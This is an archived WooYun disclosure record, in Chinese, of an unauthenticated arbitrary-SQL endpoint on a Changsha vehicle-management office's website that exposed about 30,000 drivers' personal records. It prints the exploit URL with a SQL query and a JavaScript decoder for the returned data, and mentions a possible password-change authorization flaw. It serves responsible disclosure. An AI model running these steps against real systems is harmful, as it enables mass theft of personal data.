{"id": 56558, "wybug_id": "wooyun-2014-057342", "wybug_title": "某市车管所任意SQL执行漏洞，3W用户车辆信息泄露", "wybug_corp": "长沙市公安局交通警察支队车队管理所", "wybug_author": "龙龙", "wybug_date": "2014-04-17 10:56", "wybug_open_date": "2014-06-01 10:56", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "任意"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向公众公开  简要描述： 任意SQL执行！约3万多驾驶员姓名、手机号码、身份证、家庭住址、车牌号、车辆识别码、档案编号泄露. 详细说明：  漏洞站点：  长沙市公安局交通警察支队车队管理所  http://www.csjjcgs.cn1.网页脚本泄露敏感接口  注册页面，通过查看页面原码，得到一个“数据服务”敏感接口，从传参上来看，该接口主要目的本是用来进行用户名及相关信息的验证，但并未做任何限制，参数为SQL语句。\ndatasetService?sql=\"+strSql;\n\n\n2.未授权访问，任意SQL执行  代入相关SQL语句，获取用户表及数据集。返回的数据集进行了简单的加密。\nhttp://www.csjjcgs.cn/datasetService?sql=select%20*%20from%20v_yw_yhzcjbxx%20where%20rownum%3C10\n\n\n3.结果集解密，还原敏感信息  就地取材（通过select.js中的decode函数进行解密），以进行数据还原。  此处为了方便还原数据，编写一小工具用于数据还原测试。\n<html><body><textarea rows=\"10\" cols=\"200\" id=\"t1\"></textarea><br><input type=\"button\" style=\"margin-left:200px;\" value=\"Decode\" onclick=\"writetext();\" /><br><textarea rows=\"10\" cols=\"200\" id=\"d1\"></textarea><script>function writetext(){   var v =document.getElementById(\"t1\").value;   var d =decode(v);      document.getElementById(\"d1\").value = d;   }function decode(strIn){\tvar intLen=strIn.length;\tvar strOut=\"\";\tvar strTemp;\tfor(var i=0;i<intLen;i++)\t{\t\tstrTemp=strIn.charAt(i);\t\tswitch(strTemp)\t\t{\t\t\tcase\"~\":\t\t\t{\t\t\t\tstrTemp=strIn.substring(i+1,i+3);\t\t\t\tstrTemp=parseInt(strTemp,16);\t\t\t\tstrTemp=String.fromCharCode(strTemp);\t\t\t\tstrOut=strOut+strTemp;\t\t\t\ti+=2;\t\t\t\tbreak;\t\t\t}\t\t\tcase\"^\":\t\t\t{\t\t\t\tstrTemp=strIn.substring(i+1,i+5);\t\t\t\tstrTemp=parseInt(strTemp,16);\t\t\t\tstrTemp=String.fromCharCode(strTemp);\t\t\t\tstrOut=strOut+strTemp;\t\t\t\ti+=4;\t\t\t\tbreak;\t\t\t}\t\t\tdefault:\t\t\t{\t\t\t\tstrOut=strOut+strTemp;\t\t\t\tbreak;\t\t\t}\t\t}\t}\treturn(strOut);}</script></body></html>\n   漏洞证明：  \n\n注：为了证明漏洞存在，仅获取了部份数据以证明其严重性。\n\n   修复方案：  这种接口相当于开天窗，尽快重新设计接口吧不知道这个接口存在多长时间了，建议暂时下线接口，以免被黑产利用进行欺诈或其它用途。另外：  用户密码修改那一块，好象也可以越权修改他人账号。未做深入测试，请验证。   版权声明：转载请注明来源 龙龙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-04-22 08:29 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给湖南分中心处置，对于所述分析过程，较为典型，涉及信息泄露风险，rank 15 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-19 00:15 |    \t\tby小星星 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 我会唱小星星、)\t\t \n   黑产牛啊。    \n     2014-06-16 17:12 |    \t\t云云 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 我就一个马甲还要填信息？)\t\t \n  rank给的够!    \n     2014-08-03 17:22 |    \t\tMelody \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 啊)\t\t \n  怎么发现的漏洞？手动测试吗？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}